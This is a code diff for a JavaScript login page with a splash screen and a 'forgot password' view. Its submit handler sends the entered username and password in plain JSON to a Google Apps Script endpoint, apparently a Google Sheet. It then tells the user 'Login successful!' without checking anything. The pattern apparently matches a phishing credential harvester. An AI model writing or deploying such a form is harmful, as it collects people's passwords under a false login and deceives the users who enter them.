@@ -1,11 +1,41 @@
 const SCRIPT_URL = "PASTE_YOUR_WEB_APP_URL_HERE";
 
-/* Show login after splash */
-setTimeout(() => {
-document.getElementById("loginPage").style.display = "block";
-}, 3000);
+document.addEventListener("DOMContentLoaded", function () {
 
-/* Toggle pages */
+/* Splash → Login */
+setTimeout(() => {
+document.getElementById("splash").style.display = "none";
+document.getElementById("loginPage").style.display = "block";
+}, 2500);
+
+/* Form submit */
+const form = document.getElementById("loginForm");
+
+form.addEventListener("submit", function(e) {
+e.preventDefault();
+
+const data = {
+  username: form.username.value,
+  password: form.password.value
+};
+
+fetch(SCRIPT_URL, {
+  method: "POST",
+  body: JSON.stringify(data)
+})
+.then(() => {
+  alert("Login successful!");
+  form.reset();
+})
+.catch(() => {
+  alert("Error sending data");
+});
+
+});
+
+});
+
+/* Forgot page */
 function showForgot() {
 document.getElementById("loginPage").style.display = "none";
 document.getElementById("forgotPage").style.display = "block";
@@ -15,25 +45,3 @@ function goBack() {
 document.getElementById("forgotPage").style.display = "none";
 document.getElementById("loginPage").style.display = "block";
 }
-
-/* Send data to Google Sheets */
-document.getElementById("loginForm").addEventListener("submit", function(e) {
-e.preventDefault();
-
-const data = {
-username: this.username.value,
-password: this.password.value
-};
-
-fetch(SCRIPT_URL, {
-method: "POST",
-body: JSON.stringify(data)
-})
-.then(() => {
-alert("Login successful!");
-this.reset();
-})
-.catch(() => {
-alert("Error sending data");
-});
-});
